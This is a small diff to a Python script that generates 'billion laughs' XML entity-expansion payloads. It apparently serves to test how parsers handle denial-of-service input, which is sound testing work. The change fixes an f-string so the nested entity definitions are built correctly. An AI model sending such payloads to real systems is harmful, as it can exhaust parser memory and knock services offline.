@@ -36,7 +36,7 @@ for _ in range(int(args.runs)):
     exploit = "<!DOCTYPE billion [\n"
 
     lolstring = "l" * length
-    entitydef = ['<!ENTITY a0 "{lolstring}">\n']
+    entitydef = [f'<!ENTITY a0 "{lolstring}">\n']
 
     for j in range(depth):
         entities = f"&a{j};" * multi
